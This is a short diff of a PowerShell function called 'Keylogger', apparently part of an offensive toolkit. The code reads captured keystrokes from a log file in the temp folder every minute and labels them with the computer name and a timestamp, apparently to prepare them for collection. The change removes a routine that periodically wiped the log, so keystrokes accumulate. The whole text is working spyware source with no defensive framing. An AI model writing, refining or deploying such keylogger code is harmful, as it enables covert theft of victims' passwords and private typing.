@@ -102,7 +102,6 @@ function script:Keylogger
 		$filename = "$env:temp\key.log"
         while($true) 
         { 
-            $read = 0
             Start-Sleep -Seconds 60
 			
 			$data = Get-Content $filename
@@ -217,12 +216,7 @@ function script:Keylogger
 			}
 			
             $pastevalue=$out
-            $read++
-            if ($read -eq 30)
-            {
-                Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
-                $read = 0
-            }
+			
             $now = Get-Date; 
             $name = $env:COMPUTERNAME 
             $pastename = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
